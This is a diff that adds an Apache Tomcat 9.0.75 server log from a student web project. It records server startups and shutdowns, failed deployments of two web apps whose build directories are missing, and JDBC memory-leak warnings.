@@ -1,0 +1,1058 @@
+11-Jun-2023 21:28:32.131 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/9.0.75
+11-Jun-2023 21:28:32.137 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          May 4 2023 13:04:05 UTC
+11-Jun-2023 21:28:32.138 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 9.0.75.0
+11-Jun-2023 21:28:32.138 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
+11-Jun-2023 21:28:32.138 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.15.0-73-generic
+11-Jun-2023 21:28:32.138 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
+11-Jun-2023 21:28:32.138 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-11-openjdk-amd64
+11-Jun-2023 21:28:32.138 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           11.0.19+7-post-Ubuntu-0ubuntu120.04.1
+11-Jun-2023 21:28:32.138 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Ubuntu
+11-Jun-2023 21:28:32.139 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75
+11-Jun-2023 21:28:32.139 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75
+11-Jun-2023 21:28:32.195 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.base/java.lang=ALL-UNNAMED
+11-Jun-2023 21:28:32.196 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.base/java.io=ALL-UNNAMED
+11-Jun-2023 21:28:32.197 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.base/java.util=ALL-UNNAMED
+11-Jun-2023 21:28:32.197 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.base/java.util.concurrent=ALL-UNNAMED
+11-Jun-2023 21:28:32.197 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED
+11-Jun-2023 21:28:32.198 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/logging.properties
+11-Jun-2023 21:28:32.198 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
+11-Jun-2023 21:28:32.198 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dhttp.nonProxyHosts=localhost|127.0.0.1|anbvhe150476
+11-Jun-2023 21:28:32.198 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
+11-Jun-2023 21:28:32.198 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
+11-Jun-2023 21:28:32.198 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
+11-Jun-2023 21:28:32.198 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
+11-Jun-2023 21:28:32.198 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75
+11-Jun-2023 21:28:32.198 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75
+11-Jun-2023 21:28:32.198 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/temp
+11-Jun-2023 21:28:32.235 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent An older version [1.2.23] of the Apache Tomcat Native library is installed, while Tomcat recommends a minimum version of [1.2.30]
+11-Jun-2023 21:28:32.236 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent Loaded Apache Tomcat Native library [1.2.23] using APR version [1.6.5].
+11-Jun-2023 21:28:32.236 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent APR capabilities: IPv6 [true], sendfile [true], accept filters [false], random [true], UDS [false].
+11-Jun-2023 21:28:32.236 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent APR/OpenSSL configuration: useAprConnector [false], useOpenSSL [true]
+11-Jun-2023 21:28:32.241 INFO [main] org.apache.catalina.core.AprLifecycleListener.initializeSSL OpenSSL successfully initialized [OpenSSL 1.1.1f  31 Mar 2020]
+11-Jun-2023 21:28:32.691 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8082"]
+11-Jun-2023 21:28:32.734 INFO [main] org.apache.catalina.startup.Catalina.load Server initialization in [1341] milliseconds
+11-Jun-2023 21:28:32.847 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
+11-Jun-2023 21:28:32.848 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/9.0.75]
+11-Jun-2023 21:28:32.855 INFO [main] org.apache.catalina.startup.HostConfig.deployDescriptor Deploying deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/mavenproject1.xml]
+11-Jun-2023 21:28:32.884 WARNING [main] org.apache.catalina.startup.HostConfig.deployDescriptor The path attribute with value [/mavenproject1] in deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/mavenproject1.xml] has been ignored
+11-Jun-2023 21:28:32.957 SEVERE [main] org.apache.catalina.startup.HostConfig.deployDescriptor Error deploying deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/mavenproject1.xml]
+	java.lang.IllegalStateException: Error starting child
+		at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:686)
+		at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:658)
+		at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:662)
+		at org.apache.catalina.startup.HostConfig.deployDescriptor(HostConfig.java:689)
+		at org.apache.catalina.startup.HostConfig$DeployDescriptor.run(HostConfig.java:1888)
+		at java.base/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515)
+		at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
+		at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75)
+		at java.base/java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:118)
+		at org.apache.catalina.startup.HostConfig.deployDescriptors(HostConfig.java:582)
+		at org.apache.catalina.startup.HostConfig.deployApps(HostConfig.java:472)
+		at org.apache.catalina.startup.HostConfig.start(HostConfig.java:1617)
+		at org.apache.catalina.startup.HostConfig.lifecycleEvent(HostConfig.java:318)
+		at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:123)
+		at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:423)
+		at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:366)
+		at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:898)
+		at org.apache.catalina.core.StandardHost.startInternal(StandardHost.java:795)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1332)
+		at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1322)
+		at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
+		at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75)
+		at java.base/java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:140)
+		at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:871)
+		at org.apache.catalina.core.StandardEngine.startInternal(StandardEngine.java:249)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.StandardService.startInternal(StandardService.java:428)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:914)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.startup.Catalina.start(Catalina.java:772)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+		at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+		at java.base/java.lang.reflect.Method.invoke(Method.java:566)
+		at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:347)
+		at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:478)
+	Caused by: org.apache.catalina.LifecycleException: Failed to start component [org.apache.catalina.webresources.StandardRoot@222a59e6]
+		at org.apache.catalina.util.LifecycleBase.handleSubClassException(LifecycleBase.java:440)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:198)
+		at org.apache.catalina.core.StandardContext.resourcesStart(StandardContext.java:4607)
+		at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:4740)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:683)
+		... 37 more
+	Caused by: java.lang.IllegalArgumentException: The main resource set specified [/home/anbvhe150476/NetBeansProjects/mavenproject1/target/mavenproject1-1.0-SNAPSHOT] is not a directory or war file, or is not readable (it does not exist or permissions to access it are missing)
+		at org.apache.catalina.webresources.StandardRoot.createMainResourceSet(StandardRoot.java:749)
+		at org.apache.catalina.webresources.StandardRoot.startInternal(StandardRoot.java:707)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		... 41 more
+11-Jun-2023 21:28:32.960 INFO [main] org.apache.catalina.startup.HostConfig.deployDescriptor Deployment of deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/mavenproject1.xml] has finished in [104] ms
+11-Jun-2023 21:28:32.960 INFO [main] org.apache.catalina.startup.HostConfig.deployDescriptor Deploying deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/PRJ301_3W.xml]
+11-Jun-2023 21:28:32.962 WARNING [main] org.apache.catalina.startup.HostConfig.deployDescriptor The path attribute with value [/PRJ301_3W] in deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/PRJ301_3W.xml] has been ignored
+11-Jun-2023 21:28:32.971 SEVERE [main] org.apache.catalina.startup.HostConfig.deployDescriptor Error deploying deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/PRJ301_3W.xml]
+	java.lang.IllegalStateException: Error starting child
+		at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:686)
+		at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:658)
+		at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:662)
+		at org.apache.catalina.startup.HostConfig.deployDescriptor(HostConfig.java:689)
+		at org.apache.catalina.startup.HostConfig$DeployDescriptor.run(HostConfig.java:1888)
+		at java.base/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515)
+		at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
+		at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75)
+		at java.base/java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:118)
+		at org.apache.catalina.startup.HostConfig.deployDescriptors(HostConfig.java:582)
+		at org.apache.catalina.startup.HostConfig.deployApps(HostConfig.java:472)
+		at org.apache.catalina.startup.HostConfig.start(HostConfig.java:1617)
+		at org.apache.catalina.startup.HostConfig.lifecycleEvent(HostConfig.java:318)
+		at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:123)
+		at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:423)
+		at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:366)
+		at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:898)
+		at org.apache.catalina.core.StandardHost.startInternal(StandardHost.java:795)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1332)
+		at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1322)
+		at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
+		at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75)
+		at java.base/java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:140)
+		at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:871)
+		at org.apache.catalina.core.StandardEngine.startInternal(StandardEngine.java:249)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.StandardService.startInternal(StandardService.java:428)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:914)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.startup.Catalina.start(Catalina.java:772)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+		at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+		at java.base/java.lang.reflect.Method.invoke(Method.java:566)
+		at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:347)
+		at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:478)
+	Caused by: org.apache.catalina.LifecycleException: Failed to start component [org.apache.catalina.webresources.StandardRoot@3f1d2e23]
+		at org.apache.catalina.util.LifecycleBase.handleSubClassException(LifecycleBase.java:440)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:198)
+		at org.apache.catalina.core.StandardContext.resourcesStart(StandardContext.java:4607)
+		at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:4740)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:683)
+		... 37 more
+	Caused by: java.lang.IllegalArgumentException: The main resource set specified [/home/anbvhe150476/NetBeansProjects/PRJ301_3W/build/web] is not a directory or war file, or is not readable (it does not exist or permissions to access it are missing)
+		at org.apache.catalina.webresources.StandardRoot.createMainResourceSet(StandardRoot.java:749)
+		at org.apache.catalina.webresources.StandardRoot.startInternal(StandardRoot.java:707)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		... 41 more
+11-Jun-2023 21:28:32.986 INFO [main] org.apache.catalina.startup.HostConfig.deployDescriptor Deployment of deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/PRJ301_3W.xml] has finished in [26] ms
+11-Jun-2023 21:28:32.986 INFO [main] org.apache.catalina.startup.HostConfig.deployDescriptor Deploying deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/team3.xml]
+11-Jun-2023 21:28:32.991 WARNING [main] org.apache.catalina.startup.HostConfig.deployDescriptor The path attribute with value [/team3] in deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/team3.xml] has been ignored
+11-Jun-2023 21:28:33.886 INFO [main] org.apache.jasper.servlet.TldScanner.scanJars At least one JAR was scanned for TLDs yet contained no TLDs. Enable debug logging for this logger for a complete list of JARs that were scanned but no TLDs were found in them. Skipping unneeded JARs during scanning can improve startup time and JSP compilation time.
+11-Jun-2023 21:28:33.963 INFO [main] org.apache.catalina.startup.HostConfig.deployDescriptor Deployment of deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/team3.xml] has finished in [977] ms
+11-Jun-2023 21:28:33.963 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/examples]
+11-Jun-2023 21:28:34.237 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/examples] has finished in [274] ms
+11-Jun-2023 21:28:34.237 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/manager]
+11-Jun-2023 21:28:34.275 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/manager] has finished in [37] ms
+11-Jun-2023 21:28:34.275 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/docs]
+11-Jun-2023 21:28:34.310 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/docs] has finished in [35] ms
+11-Jun-2023 21:28:34.313 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/host-manager]
+11-Jun-2023 21:28:34.343 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/webapps/host-manager] has finished in [31] ms
+11-Jun-2023 21:28:34.350 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8082"]
+11-Jun-2023 21:28:34.379 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in [1644] milliseconds
+11-Jun-2023 21:29:17.316 INFO [main] org.apache.catalina.core.StandardServer.await A valid shutdown command was received via the shutdown port. Stopping the Server instance.
+11-Jun-2023 21:29:17.316 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["http-nio-8082"]
+11-Jun-2023 21:29:17.317 INFO [main] org.apache.catalina.core.StandardService.stopInternal Stopping service [Catalina]
+11-Jun-2023 21:29:17.329 WARNING [main] org.apache.catalina.loader.WebappClassLoaderBase.clearReferencesJdbc The web application [team3] registered the JDBC driver [com.microsoft.sqlserver.jdbc.SQLServerDriver] but failed to unregister it when the web application was stopped. To prevent a memory leak, the JDBC Driver has been forcibly unregistered.
+11-Jun-2023 21:29:17.332 SEVERE [main] org.apache.catalina.loader.WebappClassLoaderBase.checkThreadLocalMapForLeaks The web application [team3] created a ThreadLocal with key of type [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1] (value [com.microsoft.sqlserver.jdbc.ActivityCorrelator$1@2b4c3c29]) and a value of type [com.microsoft.sqlserver.jdbc.ActivityId] (value [988ae3a9-37bc-4ffe-8633-a6ac112f635f-2]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.
+11-Jun-2023 21:29:17.355 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["http-nio-8082"]
+11-Jun-2023 21:29:17.366 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["http-nio-8082"]
+11-Jun-2023 21:29:17.367 WARNING [main] org.apache.catalina.deploy.NamingResourcesImpl.cleanUp Failed to retrieve JNDI naming context for container [StandardEngine[Catalina].StandardHost[localhost].StandardContext[/PRJ301_3W]] so no cleanup was performed for that container
+	javax.naming.NamingException: No naming context bound to this class loader
+		at org.apache.naming.ContextBindings.getClassLoader(ContextBindings.java:271)
+		at org.apache.catalina.deploy.NamingResourcesImpl.cleanUp(NamingResourcesImpl.java:1010)
+		at org.apache.catalina.deploy.NamingResourcesImpl.stopInternal(NamingResourcesImpl.java:993)
+		at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:257)
+		at org.apache.catalina.core.StandardContext.stopInternal(StandardContext.java:5194)
+		at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:257)
+		at org.apache.catalina.util.LifecycleBase.destroy(LifecycleBase.java:293)
+		at org.apache.catalina.core.ContainerBase.removeChild(ContainerBase.java:778)
+		at org.apache.catalina.core.ContainerBase.destroyInternal(ContainerBase.java:982)
+		at org.apache.catalina.util.LifecycleBase.destroy(LifecycleBase.java:321)
+		at org.apache.catalina.core.ContainerBase.removeChild(ContainerBase.java:778)
+		at org.apache.catalina.core.ContainerBase.destroyInternal(ContainerBase.java:982)
+		at org.apache.catalina.util.LifecycleBase.destroy(LifecycleBase.java:321)
+		at org.apache.catalina.core.StandardService.destroyInternal(StandardService.java:572)
+		at org.apache.catalina.util.LifecycleBase.destroy(LifecycleBase.java:321)
+		at org.apache.catalina.core.StandardServer.destroyInternal(StandardServer.java:1036)
+		at org.apache.catalina.util.LifecycleBase.destroy(LifecycleBase.java:321)
+		at org.apache.catalina.startup.Catalina.stop(Catalina.java:850)
+		at org.apache.catalina.startup.Catalina.start(Catalina.java:811)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+		at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+		at java.base/java.lang.reflect.Method.invoke(Method.java:566)
+		at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:347)
+		at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:478)
+11-Jun-2023 21:29:20.442 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/9.0.75
+11-Jun-2023 21:29:20.445 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          May 4 2023 13:04:05 UTC
+11-Jun-2023 21:29:20.445 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 9.0.75.0
+11-Jun-2023 21:29:20.445 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
+11-Jun-2023 21:29:20.446 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.15.0-73-generic
+11-Jun-2023 21:29:20.446 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
+11-Jun-2023 21:29:20.446 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-11-openjdk-amd64
+11-Jun-2023 21:29:20.446 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           11.0.19+7-post-Ubuntu-0ubuntu120.04.1
+11-Jun-2023 21:29:20.446 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Ubuntu
+11-Jun-2023 21:29:20.446 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75
+11-Jun-2023 21:29:20.446 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75
+11-Jun-2023 21:29:20.475 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.base/java.lang=ALL-UNNAMED
+11-Jun-2023 21:29:20.475 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.base/java.io=ALL-UNNAMED
+11-Jun-2023 21:29:20.475 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.base/java.util=ALL-UNNAMED
+11-Jun-2023 21:29:20.475 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.base/java.util.concurrent=ALL-UNNAMED
+11-Jun-2023 21:29:20.475 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED
+11-Jun-2023 21:29:20.475 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/logging.properties
+11-Jun-2023 21:29:20.476 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
+11-Jun-2023 21:29:20.476 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dhttp.nonProxyHosts=localhost|127.0.0.1|anbvhe150476
+11-Jun-2023 21:29:20.476 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
+11-Jun-2023 21:29:20.476 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
+11-Jun-2023 21:29:20.476 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
+11-Jun-2023 21:29:20.477 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
+11-Jun-2023 21:29:20.477 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75
+11-Jun-2023 21:29:20.477 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75
+11-Jun-2023 21:29:20.477 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/temp
+11-Jun-2023 21:29:20.485 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent An older version [1.2.23] of the Apache Tomcat Native library is installed, while Tomcat recommends a minimum version of [1.2.30]
+11-Jun-2023 21:29:20.485 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent Loaded Apache Tomcat Native library [1.2.23] using APR version [1.6.5].
+11-Jun-2023 21:29:20.485 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent APR capabilities: IPv6 [true], sendfile [true], accept filters [false], random [true], UDS [false].
+11-Jun-2023 21:29:20.485 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent APR/OpenSSL configuration: useAprConnector [false], useOpenSSL [true]
+11-Jun-2023 21:29:20.493 INFO [main] org.apache.catalina.core.AprLifecycleListener.initializeSSL OpenSSL successfully initialized [OpenSSL 1.1.1f  31 Mar 2020]
+11-Jun-2023 21:29:20.900 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8082"]
+11-Jun-2023 21:29:20.948 INFO [main] org.apache.catalina.startup.Catalina.load Server initialization in [760] milliseconds
+11-Jun-2023 21:29:21.041 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
+11-Jun-2023 21:29:21.042 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/9.0.75]
+11-Jun-2023 21:29:21.049 INFO [main] org.apache.catalina.startup.HostConfig.deployDescriptor Deploying deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/mavenproject1.xml]
+11-Jun-2023 21:29:21.079 WARNING [main] org.apache.catalina.startup.HostConfig.deployDescriptor The path attribute with value [/mavenproject1] in deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/mavenproject1.xml] has been ignored
+11-Jun-2023 21:29:21.120 SEVERE [main] org.apache.catalina.startup.HostConfig.deployDescriptor Error deploying deployment descriptor [/home/anbvhe150476/NetBeansProjects/DBS401Web/other/apache-tomcat-9.0.75/conf/Catalina/localhost/mavenproject1.xml]
+	java.lang.IllegalStateException: Error starting child
+		at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:686)
+		at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:658)
+		at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:662)
+		at org.apache.catalina.startup.HostConfig.deployDescriptor(HostConfig.java:689)
+		at org.apache.catalina.startup.HostConfig$DeployDescriptor.run(HostConfig.java:1888)
